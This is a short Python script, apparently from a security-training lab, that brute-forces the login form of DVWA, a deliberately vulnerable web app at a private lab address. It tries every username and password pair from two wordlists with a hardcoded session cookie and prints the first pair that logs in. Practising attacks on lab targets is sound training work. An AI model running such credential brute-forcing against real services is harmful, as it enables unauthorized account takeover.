from bs4 import BeautifulSoup
import requests
header = {"Cookie": "security=low; PHPSESSID=7abbe6947b18fdc2d1d2b95271581d6f"}
user_file = open("/home/kali/Desktop/usernames.lst")
passwords_file = open("/home/kali/Desktop/passwords.lst")
user_lista = user_file.readlines()
passwords_lista = passwords_file.readlines()
for user in user_lista:
    for password in passwords_lista:
        url = "http://192.168.32.101/dvwa/vulnerabilities/brute/"
        r = requests.get(url, headers = header)
        soup = BeautifulSoup (r.text, "html.parser")
        user = user.strip()
        password = password.strip()
        get_data = {"username": user, "password": password, "Login": 'Login'}
        print("\n", user, " ", password)
        r = requests.get(url, params = get_data, headers = header)
        if not 'Username and/or password incorrect.' in r.text:
            print("\nAccesso riuscito username: ", user, "- password: ", password)
            exit()


